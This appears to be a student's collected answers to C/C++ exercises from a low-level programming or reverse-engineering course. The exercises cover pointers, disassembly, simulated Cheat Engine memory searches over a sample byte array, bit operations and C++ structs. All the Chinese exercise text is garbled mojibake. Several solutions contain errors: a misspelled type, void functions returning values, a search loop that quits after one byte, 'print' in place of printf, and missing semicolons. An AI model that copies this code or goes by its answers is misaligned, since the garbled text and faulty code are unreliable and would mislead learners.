s1-s2;\t//xçš„å€¼æ˜¯å¤šå°‘ï¼Ÿ\t12 åˆ—å‡ºæ¯ä¸€è¡Œçš„åæ±‡ç¼–ä»£ç ï¼š\nchar a = 10;\tshort b = 20;\tint c = 30;\tchar* pa = \u0026a;\tshort* pb = \u0026b;\tint* pc = \u0026c;\tchar** ppa = \u0026pa;\tshort** ppb = \u0026pb;\tint** ppc = \u0026pc;\t12: char* pa = \u0026a; 00401039 lea eax,[ebp-4] 0040103C mov dword ptr [ebp-10h],eax 13: short* pb = \u0026b; 0040103F lea ecx,[ebp-8] 00401042 mov dword ptr [ebp-14h],ecx 14: int* pc = \u0026c; 00401045 lea edx,[ebp-0Ch] 00401048 mov dword ptr [ebp-18h],edx 15: 16: 17: 18: char** ppa = \u0026pa; 0040104B lea eax,[ebp-10h] 0040104E mov dword ptr [ebp-1Ch],eax 19: short** ppb = \u0026pb; 00401051 lea ecx,[ebp-14h] 00401054 mov dword ptr [ebp-20h],ecx 20: int** ppc = \u0026pc; 00401057 lea edx,[ebp-18h] 0040105A mov dword ptr [ebp-24h],edx åˆ—å‡ºæ¯ä¸€è¡Œçš„åæ±‡ç¼–ä»£ç ï¼š\nint p = 10;\tint******* p7;\tint****** p6;\tint***** p5;\tint**** p4;\tint*** p3;\tint** p2;\tint* p1;\tp1 = \u0026p;\tp2 = \u0026p1;\tp3 = \u0026p2;\tp4 = \u0026p3;\tp5 = \u0026p4;\tp6 = \u0026p5;\tp7 = \u0026p6;\t16: p1 = \u0026p; 0040102F lea eax,[ebp-4] 00401032 mov dword ptr [ebp-20h],eax 17: p2 = \u0026p1; 00401035 lea ecx,[ebp-20h] 00401038 mov dword ptr [ebp-1Ch],ecx 18: p3 = \u0026p2; 0040103B lea edx,[ebp-1Ch] 0040103E mov dword ptr [ebp-18h],edx 19: p4 = \u0026p3; 00401041 lea eax,[ebp-18h] 00401044 mov dword ptr [ebp-14h],eax 20: p5 = \u0026p4; 00401047 lea ecx,[ebp-14h] 0040104A mov dword ptr [ebp-10h],ecx 21: p6 = \u0026p5; 0040104D lea edx,[ebp-10h] 00401050 mov dword ptr [ebp-0Ch],edx 22: p7 = \u0026p6; 00401053 lea eax,[ebp-0Ch] 00401056 mov dword ptr [ebp-8],eax å®Œæˆä»£ç ï¼Œå®ç°æ•°ç»„å€¼çš„äº’æ¢\nvoid Function()\t{\tint arr[5] = {1,2,3,4,5};\t//..æ­¤å¤„æ·»åŠ ä»£ç ï¼Œä½¿ç”¨æŒ‡é’ˆï¼Œå°†æ•°ç»„çš„å€¼å€’ç½®\t//æ‰“å°æ•°ç»„å€¼çš„ä»£ç å·²ç»å†™å®Œï¼Œä¸éœ€è¦ä¿®æ”¹\tfor(int k=0;k\u003c5;k++)\t{\tprintf(\"%d\\n\",*(p+k));\t}\t}\tvoid Function()\t{\tint arr[5] = {1,2,3,4,5};\tint *p = arr; int k=0; int i = 0; int t; for (i = 0; i \u003c 5 / 2; i++) { t = *(p + i); *(p + i) = *(p + 4 - i); *(p + 4 - i) = t; } for(;k\u003c5;k++)\t{\tprintf(\"%d\\n\",*(p+k));\t}\t}\tæ¨¡æ‹Ÿå®ç°CEçš„æ•°æ®æœç´¢åŠŸèƒ½ï¼š\nè¿™ä¸€å †æ•°æ®ä¸­å­˜å‚¨äº†è§’è‰²çš„è¡€å€¼ä¿¡æ¯ï¼Œå‡è®¾è¡€å€¼çš„ç±»å‹ä¸ºintç±»å‹ï¼Œå€¼ä¸º100ï¼ˆ10è¿›åˆ¶ï¼‰ï¼Œè¯·åˆ—å‡ºæ‰€æœ‰å¯èƒ½çš„å€¼ä»¥åŠè¯¥å€¼å¯¹åº”çš„åœ°å€\n0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,\t0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,\t0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11,\t0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,\t0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00,\t0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,\t0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,\t0x00,0x02,0x74,0x0F,0x41,0x00,0x06,0x08,0x00,0x00,\t0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,\t0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00\tchar arr[100] = { 0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,\t0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,\t0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11,\t0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,\t0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00,\t0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,\t0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,\t0x00,0x02,0x74,0x0F,0x41,0x00,0x06,0x08,0x00,0x00,\t0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,\t0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00\t}; void findaddr(int num) { char* start = arr; int i = 0; int* pt = (int*)start; while(i\u003c100) { if(*pt==num) { printf(\"[%x]=%d\\n\", start, *pt); } i++; start++; pt = (int*)start; } } void main() { findaddr(0x64); } æ¨¡æ‹Ÿå®ç°CEçš„æ•°æ®æœç´¢åŠŸèƒ½ï¼š\nè¿™ä¸€å †æ•°æ®ä¸­å­˜å‚¨äº†è§’è‰²çš„åå­—ä¿¡æ¯ï¼ˆWOWï¼‰ï¼Œè¯·åˆ—å‡ºè§’è‰²åçš„å†…å­˜åœ°å€\n0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,\t0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,\t0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11,\t0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,\t0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00,\t0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,\t0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,\t0x00,0x02,0x57,0x4F,0x57,0x00,0x06,0x08,0x00,0x00,\t0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,\t0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00\t#include \u003cstdio.h\u003e char arr[100] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x57, 0x4F, 0x57, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00 }; void Findasc() { char* p=arr; char * z=\"WOW\"; int* x; int* y; int i=0; for(; i\u003c98; i++) { x=(int*)(p+i); y=(int*)z; if (*(p + i) == z[0] \u0026\u0026 *(p + i + 1) == z[1] \u0026\u0026 *(p + i + 2) == z[2]) printf(\"%x == %s\",x,y); } } void main() { Findasc(); } ç¼–å†™å‡½æ•°ï¼Œè¿”å›è§’è‰²åå­—ä¿¡æ¯çš„åœ°å€ï¼Œå¦‚æœæ²¡æœ‰è¿”å›0\nchar* FindRoleNameAddr(char* pData,char* pRoleName) { size_t nameLength = strlen(pRoleName); for (char* ptr = pData; *ptr != '\\0'; ptr++) { if (strncmp(ptr, pRoleName, nameLength) == 0) { return ptr; }else return 0; } } ç¼–å†™å‡½æ•°ï¼Œéå†ä¸Šé¢æ•°æ®ä¸­æ‰€æœ‰è§’è‰²åå­—\n#include \u003cstdio.h\u003e char arr[100] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x57, 0x4F, 0x57, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00 }; void FindAllRoleNames(char* pData) { char* start = pData; char name[50]; int i = 0; while (i \u003c 100) { if (*(start + i) != 0) { int j = 0; while (i \u003c 100 \u0026\u0026 *(start + i) != 0) { name[j++] = *(start + i); i++; } name[j] = '\\0'; printf(\"name: %s\\n\", name); } i++; } } int main() { FindAllRoleNames(arr); return 0; } åˆ›å»ºä¸€ä¸ªint* arr[5]æ•°ç»„ï¼Œå¹¶ä¸ºæ•°ç»„èµ‹å€¼ï¼ˆä½¿ç”¨\u0026ï¼‰\nint a1 = 1;\tint a2 = 2;\tint a3 = 3;\tint a4 = 4;\tint a5 = 5;\tint* p1 = \u0026a1;\tint* p2 = \u0026a2;\tint* p3 = \u0026a3;\tint* p4 = \u0026a4;\tint* p5 = \u0026a5;\tint* arr[5] = {p1,p2,p3,p4,p5}; for (int i = 0; i \u003c 5; i++) { printf(\"arr[%d] = %d\\n\", i, *arr[i]); } åˆ›å»ºä¸€ä¸ªå­—ç¬¦æŒ‡é’ˆæ•°ç»„ï¼Œå­˜å‚¨æ‰€æœ‰çš„Cçš„å…³é”®è¯ï¼ˆæŸ¥èµ„æ–™æ‰¾ï¼‰ï¼Œå¹¶å…¨éƒ¨æ‰“å°å‡ºæ¥\n#include \u003cstdio.h\u003e int main() { char* a1 = \"auto\"; char* a2 = \"break\"; char* a3 = \"case\"; char* a4 = \"char\"; char* a5 = \"const\"; char* a6 = \"continue\"; char* a7 = \"default\"; char* a8 = \"do\"; char* a9 = \"double\"; char* a10 = \"else\"; char* a11 = \"enum\"; char* a12 = \"extern\"; char* a13 = \"float\"; char* a14 = \"for\"; char* a15 = \"goto\"; char* a16 = \"if\"; char* a17 = \"int\"; char* a18 = \"long\"; char* a19 = \"register\"; char* a20 = \"restrict\"; char* a21 = \"return\"; char* a22 = \"short\"; char* a23 = \"signed\"; char* a24 = \"sizeof\"; char* a25 = \"static\"; char* a26 = \"struct\"; char* a27 = \"switch\"; char* a28 = \"typedef\"; char* a29 = \"union\"; char* a30 = \"unsigned\"; char* a31 = \"void\"; char* a32 = \"volatile\"; char* a33 = \"while\"; char* a34 = \"_Alignas\"; char* a35 = \"_Alignof\"; char* a36 = \"_Atomic\"; char* a37 = \"_Bool\"; char* a38 = \"_Complex\"; char* a39 = \"_Generic\"; char* a40 = \"_Imaginary\"; char* a41 = \"_Noreturn\"; char* a42 = \"_Static_assert\"; char* a43 = \"_Thread_local\"; char* sym[] = { a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16, a17, a18, a19, a20, a21, a22, a23, a24, a25, a26, a27, a28, a29, a30, a31, a32, a33, a34, a35, a36, a37, a38, a39, a40, a41, a42, a43 }; int num_keywords = sizeof(sym) / sizeof(sym[0]); for (int i = 0; i \u003c num_keywords; i++) { printf(\"%s\\n\", sym[i]); } return 0; } æŸ¥æ‰¾è¿™äº›æ•°æ®ä¸­ï¼Œæœ‰å‡ ä¸ªid=1 level=8çš„ç»“æ„ä½“ä¿¡æ¯ã€‚\n0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,\t0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,\t0x00,0x33,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00,\t0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,\t0x00,0x00,0x64,0x01,0x00,0x00,0x00,0x08,0x00,0x00,\t0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,\t0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,\t0x00,0x02,0x57,0x4F,0x57,0x00,0x06,0x08,0x00,0x00,\t0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,\t0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00\tç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š\ttypedef struct TagPlayer\t{\tint id;\tint level;\t}Player;\tchar arr[] = { 0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,\t0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,\t0x00,0x33,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00,\t0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,\t0x00,0x00,0x64,0x01,0x00,0x00,0x00,0x08,0x00,0x00,\t0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,\t0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,\t0x00,0x02,0x57,0x4F,0x57,0x00,0x06,0x08,0x00,0x00,\t0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,\t0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00\t}; typedef struct TagPlayer\t{\tint id;\tint level;\t}Player; void Fun() { Player* p; p = (Player*)arr; char* q = (char*)p; for(int i=0;i\u003c92;i++) { if(p-\u003eid == 0x1 \u0026\u0026 p-\u003elevel == 0x8) {\tprintf(\"%x\\n\",p); }\tq++; p = (Player*)q; } } int main(int argc, char* argv[]) { Fun(); return 0; } *(p+1)[2]æ˜¯å¦ä¸€å®šç­‰äºp[1][2]å‘¢ï¼Ÿ é€šè¿‡åæ±‡ç¼–è¿›è¡Œè®ºè¯ã€‚\n#include \u003cstdio.h\u003e int main() { {% raw %} int arr[3][3] = {{1, 2, 3}, {4, 5, 6}, {7, 8, 9}}; {% endraw %} int (*p)[3] = arr; printf(\"*(p+1)[2]: %d\\n\", *(p+1)[2]); printf(\"p[1][2]: %d\\n\", p[1][2]); return 0; } å·®åˆ«ï¼š .text:0000000000001188 ; 15: printf(\"*(p+1)[2]: %d\\n\", (unsigned int)v4[9]); .text:0000000000001188 mov rax, [rbp+var_8] .text:000000000000118C add rax, 24h ; '$' .text:0000000000001190 mov eax, [rax] .text:0000000000001192 mov esi, eax .text:00000000000011A8 ; 16: printf(\"p[1][2]: %d\\n\", (unsigned int)v5[5]); .text:00000000000011A8 mov rax, [rbp+var_8] .text:00000000000011AC add rax, 0Ch .text:00000000000011B0 mov eax, [rax+8] .text:00000000000011B3 mov esi, eax ä½¿ç”¨æ•°ç»„æŒ‡é’ˆéå†ä¸€ä¸ªä¸€ç»´æ•°ç»„\n#include \u003cstdio.h\u003e int main() { int arr[] = {1, 2, 3, 4, 5}; int *ptr = arr; for (int i = 0; i \u003c 5; i++) { printf(\"Element %d: %d\\n\", i, *(ptr + i)); } return 0; } å°†ä¸€ä¸ªå‡½æ•°å­˜å‚¨åˆ°æ•°æ®åŒºï¼Œé€šè¿‡æŒ‡é’ˆè¿›è¡Œè®¿é—®\n#include \u003cstdio.h\u003e unsigned char arr[] = { 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x40, 0x53, 0x56, 0x57, 0x8D, 0x7D, 0xC0, 0xB9, 0x10, 0x00, 0x00, 0x00, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xF3, 0xAB, 0x8B, 0x45, 0x08, 0x2B, 0x45, 0x0C, 0x5F, 0x5E, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3 }; int main() { typedef int (*pFun)(int,int); pFun p = (int (*)(int ,int ))\u0026arr; int x = 0; x = p(9,5); printf(\"%d\",x); return 0; } charæ•°ç»„å†…å®¹å¦‚ä¸‹ï¼š\n0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09,\t0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,\t0x00,0x33,0x00,0x47,0x0C,0x0E,0x00,0x0D,0x00,0x11,\t0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,\t0x00,0x00,0x64,0x10,0x00,0x00,0x00,0x00,0x00,0x00,\t0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00,\t0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,\t0x00,0x02,0x74,0x0F,0x41,0x00,0x06,0x08,0x00,0x00,\t0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00,\t0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00\tä¸è¿è¡Œè¯´å‡ºä¸‹é¢çš„ç»“æœï¼š\tæŒ‡é’ˆå®šä¹‰å¦‚ä¸‹ï¼š\t*(*(px+0)+0) =\u003e 03020100\tint (*px)[2]; *(*(px+1)+0)\tint (*py)[2][3]; *(*(px+2)+3)\tchar (*pz)[2];\t*(*(*(py+1)+2)+3)\tchar (*pk)[2][3];\t*(*(pz+2)+3)\t*(*(*(pk+2)+3)+4)\tä½è¿ç®— å®šä¹‰ä¸€ä¸ªunsiged charç±»å‹ï¼Œé€šè¿‡ç¨‹åºä¸ºç¬¬3ã€5ã€7ä½èµ‹å€¼ï¼Œèµ‹å€¼æ—¶ä¸èƒ½å½±å“åˆ°å…¶å®ƒä½åŸæ¥çš„å€¼ï¼ˆä½¿ç”¨ä½æ“ä½œæŒ‡ä»¤ã€æ¯”å¦‚ï¼š\u0026 | ! ^ \u003c\u003c \u003e\u003eç­‰ï¼‰\n#include \u003cstdio.h\u003e int main() { unsiged char x = 9; x = x | (1 \u003c\u003c 2); x = x | (1 \u003c\u003c 4); x = x | (1 \u003c\u003c 6); return 0; } åˆ¤æ–­æŸä¸ªä½çš„å€¼æ˜¯å¦ä¸º1ï¼ˆä½¿ç”¨ä½æ“ä½œæŒ‡ä»¤ã€æ¯”å¦‚ï¼š\u0026 | ! ^ \u003c\u003c \u003e\u003eç­‰ï¼‰\nint main() { unsigned char x = 85; int bit = 3; unsigned char mask = 1 \u003c\u003c bit; if (x \u0026 mask) { printf(\"1\"); } else { printf(\"0\"); } return 0; } è¯»å–ç¬¬7ã€6ã€5ä½çš„å€¼ï¼Œä»¥åè¿›åˆ¶æ˜¾ç¤ºï¼ˆunsignedï¼‰\nint main() { unsigned char x = 85; unsigned char ge = 0; unsigned char shi = 0; unsigned char bai = 0; unsigned char mask = 111 \u003c\u003c 4; x = x ^ mask; ge = x \u0026 1; shi = x \u0026 (1\u003c\u003c1) \u003e\u003e 1; bai = x \u0026 (1\u003c\u003c2) \u003e\u003e 2; printf(\"%d\",ge+shi*2+bai*4); return 0; } ç”¨åå…­è¿›åˆ¶æ–‡æœ¬ç¼–è¾‘å™¨åˆ†åˆ«æ‰“å¼€ä¸€ä¸ª.exe .dll .sys .txt .doc .jpg .pdfç­‰å°†å‰å››ä¸ªå­—èŠ‚å†™åœ¨ä¸‹é¢\n.exe =\u003e 4D 5A .dll =\u003e 4D 5A .sys =\u003e 4D 5A .txt =\u003e 00 00 .doc =\u003e 50 4B .jpg =\u003e FF D8 .pdf =\u003e 25 50 å°†ä¸€ä¸ªåœ¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ä¸­æ‰“å¼€çš„.exeæ–‡ä»¶ï¼Œæ‹–æ‹½åˆ°æœ€åï¼Œè§‚å¯Ÿæ–‡ä»¶ä¸­çš„å¤§å°å’Œç¡¬ç›˜ä¸Šçš„å¤§å°\nç›¸åŒ C++ thisæŒ‡é’ˆ è®¾è®¡ä¸€ä¸ªç»“æ„ä½“ï¼Œæœ‰ä¸¤ä¸ªintç±»å‹çš„æˆå‘˜Xï¼ŒYåœ¨ç»“æ„ä½“å†…éƒ¨å®šä¹‰4ä¸ªå‡½æ•°åˆ†åˆ«å®ç°å¯¹XYçš„åŠ æ³•ã€å‡æ³•ã€ä¹˜æ³•ä¸é™¤æ³•çš„åŠŸèƒ½\nstruct start { int X; int Y; int add() { return this-\u003eX + this-\u003eY; } int sub() { return this-\u003eX - this-\u003eY; } int mul() { return this-\u003eX * this-\u003eY; } int div() { return this-\u003eX / this-\u003eY; } }; è§‚å¯Ÿè¿™äº›å‡½æ•°è°ƒç”¨çš„æ—¶å€™ï¼Œä¸å…¶ä»–çš„å‡½æ•°è°ƒç”¨æœ‰å“ªäº›ä¸åŒï¼Ÿä»å‚æ•°ä¼ é€’ã€å‹æ ˆé¡ºåºã€å †æ ˆå¹³è¡¡æ¥æ€»ç»“\nå…¶ä»–çš„å‡½æ•°è°ƒç”¨æ˜¯é€šè¿‡å¯„å­˜å™¨æˆ–æ ˆä¼ é€’å‚æ•°çš„ï¼Œè€Œè¿™äº›åˆ™æ˜¯é€šè¿‡[rbp-8]æ¥ä¼ é€’ç¬¬ä¸€ä¸ªå‚æ•°\nstart::add(): push rbp mov rbp, rsp mov QWORD PTR [rbp-8], rdi ;æ ˆä¸­å­˜å‚¨æŒ‡é’ˆï¼Œåç»­è§£å¼•ç”¨æ“ä½œå†…å­˜æ•°æ® mov rax, QWORD PTR [rbp-8] mov edx, DWORD PTR [rax] mov rax, QWORD PTR [rbp-8] mov eax, DWORD PTR [rax+4] add eax, edx pop rbp ret add(int, int): push rbp mov rbp, rsp mov DWORD PTR [rbp-4], edi ;æ ˆä¸­ç›´æ¥å­˜å‚¨æ•´æ•°ï¼Œç›´æ¥åŠ è½½è‡³å¯„å­˜å™¨è¿›è¡Œç®—æœ¯è¿ç®— mov DWORD PTR [rbp-8], esi mov edx, DWORD PTR [rbp-4] mov eax, DWORD PTR [rbp-8] add eax, edx pop rbp ret ç»“æ„ä½“çš„å¤§å°æ˜¯å¤šå°‘ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ\n8 ä¸‹é¢ä»£ç èƒ½å¦æ‰§è¡Œï¼Ÿï¼ˆâˆšï¼‰\nstruct Person { void Fn_1() { printf(\"Person:Fn_1()\\n\"); } void Fn_2() { printf(\"Person:Fn_2()%x\\n\"); } }; int main(int argc, char* argv[]) { Person* p = NULL; p-\u003eFn_1(); p-\u003eFn_2(); return 0; } ä¸‹é¢ä»£ç èƒ½å¦æ‰§è¡Œï¼Ÿï¼ˆÃ—ï¼‰\nstruct Person { int x ; void Fn_1() { printf(\"Person:Fn_1()\\n\"); } void Fn_2() { x = 10; printf(\"Person:Fn_2()%x\\n\"); } }; int main(int argc, char* argv[]) { Person* p = NULL; p-\u003eFn_1(); p-\u003eFn_2(); return 0; } æ„é€ -ææ„å‡½æ•° è®¾è®¡ä¸€ä¸ªç»“æ„DateInfoï¼Œè¦æ±‚å…¶æ»¡è¶³ä¸‹è¿°è¦æ±‚ã€‚\næœ‰ä¸‰ä¸ªæˆå‘˜ï¼š int year; int month; int day; è¦æ±‚æœ‰ä¸ªå¸¦å‚æ•°çš„æ„é€ å‡½æ•°ï¼Œå…¶å‚æ•°åˆ†åˆ«ä¸ºå¯¹åº”å¹´ã€æœˆã€æ—¥ã€‚ æœ‰ä¸€ä¸ªæ— å‚æ•°çš„æ„é€ å‡½æ•°ï¼Œå…¶åˆå§‹çš„å¹´ã€æœˆã€æ—¥åˆ†åˆ«ä¸ºï¼š2015ã€4ã€2ã€‚ è¦æ±‚æœ‰ä¸€ä¸ªæˆå‘˜å‡½æ•°å®ç°æ—¥æœŸçš„è®¾ç½®ï¼šSetDay(int day) è¦æ±‚æœ‰ä¸€ä¸ªæˆå‘˜å‡½æ•°å®ç°æ—¥æœŸçš„è·å–ï¼šGetDay() è¦æ±‚æœ‰ä¸€ä¸ªæˆå‘˜å‡½æ•°å®ç°å¹´ä»½çš„è®¾ç½®ï¼šSetYear(int year) è¦æ±‚æœ‰ä¸€ä¸ªæˆå‘˜å‡½æ•°å®ç°å¹´ä»½çš„è·å–ï¼šGetYear() è¦æ±‚æœ‰ä¸€ä¸ªæˆå‘˜å‡½æ•°å®ç°æœˆä»½çš„è®¾ç½®ï¼šSetMonth(int month) è¦æ±‚æœ‰ä¸€ä¸ªæˆå‘˜å‡½æ•°å®ç°æœˆä»½çš„è·å–ï¼šGetMonth() struct DateInfo { int year; int month; int day; DateInfo(int year,int month,int day) { this -\u003e year = year; this -\u003e month = month; this -\u003e day = day; } DateInfo() { this -\u003e year = 2015; this -\u003e month = 4; this -\u003e day = 2; } void SetDay(int day) { this -\u003e day = day; } int GetDay() { return this -\u003e day; } void SetYear(int year) { this -\u003e year = year; } int GetYear() { return this -\u003e year; } void SetMonth(int month) { this -\u003e month = month; } int GetMonth() { return this -\u003e month; } } è®¾è®¡ä¸€ä¸ªç»“æ„TimeInfoï¼Œè¦æ±‚å…¶æ»¡è¶³ä¸‹è¿°è¦æ±‚ã€‚\nè¯¥ç»“æ„ä¸­åŒ…å«è¡¨ç¤ºæ—¶é—´çš„æ—¶ã€åˆ†ã€ç§’ã€‚ è®¾ç½®è¯¥ç»“æ„ä¸­æ—¶ã€åˆ†ã€ç§’çš„å‡½æ•°ã€‚ è·å–è¯¥ç»“æ„ä¸­æ—¶ã€åˆ†ã€ç§’çš„ä¸‰ä¸ªå‡½æ•°ï¼šGetHour()ï¼ŒGetMinute()å’ŒGetSecond()ã€‚ struct TimeInfo { int hour; int minute; int second; TimeInfo(int hour,int minute,int second) { this -\u003e hour= hour; this -\u003e minute= minute; this -\u003e second= second; } void GetHour() { return this -\u003e hour; } void GetMinute() { return this -\u003e minute; } void GetSecond() { return this -\u003e second; } } è®©TimeInfoç»§æ‰¿DateInfoåˆ†åˆ«ä½¿ç”¨DataInfoå’ŒTimeInfoçš„æŒ‡é’ˆè®¿é—®TimeInfo\nstruct DateInfo { int year; int month; int day; DateInfo(int year,int month,int day) { this -\u003e year = year; this -\u003e month = month; this -\u003e day = day; } DateInfo() { this -\u003e year = 2015; this -\u003e month = 4; this -\u003e day = 2; } void SetDay(int day) { this -\u003e day = day; } int GetDay() { return this -\u003e day; } void SetYear(int year) { this -\u003e year = year; } int GetYear() { return this -\u003e year; } void SetMonth(int month) { this -\u003e month = month; } int GetMonth() { return this -\u003e month; } } struct TimeInfo:DateInfo { int hour; int minute; int second; TimeInfo(int hour,int minute,int second) { this -\u003e hour= hour; this -\u003e minute= minute; this -\u003e second= second; } void GetHour() { return this -\u003e hour; } void GetMinute() { return this -\u003e minute; } void GetSecond() { return this -\u003e second; } } è®¾è®¡ä¸€ä¸ªç»“æ„å«åšMyStringï¼Œè¦æ±‚è¯¥ç»“æ„èƒ½å¤Ÿå®Œæˆä»¥ä¸‹åŠŸèƒ½ï¼š\næ„é€ å‡½æ•°èƒ½å¤Ÿæ ¹æ®å®é™…ä¼ å…¥çš„å‚æ•°åˆ†é…å®é™…å­˜å‚¨ç©ºé—´ï¼› æä¾›ä¸€ä¸ªæ— å‚çš„æ„é€ å‡½æ•°ï¼Œé»˜è®¤åˆ†é…å¤§å°ä¸º1024ä¸ªå­—èŠ‚ï¼› ææ„å‡½æ•°é‡Šæ”¾è¯¥ç©ºé—´ï¼› ç¼–å†™æˆå‘˜å‡½æ•°SetStringï¼Œå¯ä»¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²èµ‹å€¼ç»™è¯¥ç»“æ„ï¼ˆç”³è¯·çš„ç©ºé—´ï¼‰ï¼› ç¼–å†™æˆå‘˜å‡½æ•°PrintStringï¼Œå¯ä»¥å°†è¯¥ç»“æ„çš„å†…å®¹æ‰“å°åˆ°å±å¹•ä¸Šï¼› ç¼–å†™æˆå‘˜å‡½æ•°AppendStringï¼Œç”¨äºå‘å·²æœ‰çš„æ•°æ®åé¢æ·»åŠ æ•°æ®ï¼› ç¼–å†™æˆå‘˜å‡½æ•°Sizeï¼Œç”¨äºå¾—åˆ°å½“å‰æ•°æ®çš„çœŸå®é•¿åº¦ã€‚ ç¼–å†™æµ‹è¯•ç¨‹åºï¼Œæµ‹è¯•è¿™ä¸ªç»“æ„ã€‚\nstruct MyString { char* addr; MyString(int size) { addr = (char*)malloc(size); } MyString() { addr = (char*)malloc(1024); } ~MyString() { free(addr); addr = NULL; } void SetString(char* addr) { strcpy(this -\u003e addr,addr); } void PrintString() { print(\"%s\",addr); } void AppendString(char* addr) { strcat(this -\u003e addr,addr); } void Size() { return strlen(this -\u003e addr); } } æƒé™æ§åˆ¶ 